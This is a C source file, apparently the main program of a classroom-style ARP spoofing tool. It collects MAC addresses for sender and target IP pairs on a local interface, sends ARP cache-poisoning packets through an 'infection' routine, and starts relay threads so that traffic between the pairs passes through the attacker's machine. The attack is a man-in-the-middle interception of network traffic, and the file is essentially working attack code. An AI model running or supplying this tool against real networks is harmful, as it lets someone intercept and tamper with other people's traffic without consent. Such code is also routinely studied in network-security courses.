#include "attack.h"

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}


int main(int argc, char* argv[]) {


	if (argc%2 != 0 || argc < 4) {
		usage();
		return -1;
	}
	
	// Err Setting
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pthread_t thread;
	thrArg *arg;
	
	// Struct & Var Setting
	int pair_num = (argc-2)/2;
	
	uint8_t tmp[10] = {0, };
	
	int res;
	
	int i, j; // Iterators
	
	// Store Interface
	strcpy(proto, argv[1]);
	
	// Calculate Attacker's Mac Addr
	GetMacAddr(proto, mac_addr_att);

	// Calculate Attacker's IP Addr
	GetIpAddr(proto, ip_addr_att);
	
	
	// Open PCAP
	pcap_t* hd = pcap_open_live(proto, ARP_SIZE, 1, 1, errbuf);
	if (hd == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", proto, errbuf);
		exit(1);
	}
	
	////////////// Store Every Mac Addr
	for(i=1; i<=pair_num; i++){
	
		// 1. Sender's Mac Addr   2. Target's Mac Addr
		for(j=0; j<2; j++){
			recv_mac(hd, argv[i*2 + j], mac_addr_att, ip_addr_att, tmp);
			DICT_Add(&dic, argv[i*2 + j], tmp);
		}
	}
	DICT_Show(dic);
	

	////////////// Attack For Every Pairs
	for(i=1; i<=pair_num; i++){
	
		// 1. Sender's Mac Addr   2. Target's Mac Addr
		for(j=0; j<2; j++){
			uint8_t tmp[10];
			DICT_Load(dic, argv[i*2 + j], tmp);
			
			infection(hd, argv[i*2 + j], argv[i*2 + (j+1)%2], ip_addr_att, tmp, mac_addr_att);
		}
	
	}


	////////////// Observe For Every Pairs
	for(i=1; i<=pair_num; i++){
	
		// First: sender -> target
		// Second: target -> sender
		for(j=0; j<2; j++){

			
			arg = (thrArg*)malloc(sizeof(thrArg));
			
			arg->ip_send = (uint32_t)Ip(argv[i*2 + j]);
			arg->ip_tar = (uint32_t)Ip(argv[i*2 + (j+1)%2]);
			
			pthread_create(&thread, NULL, pth_relay, (void*)arg);
			
		}
	
	}

	pcap_close(hd);
	
	while(1);
}
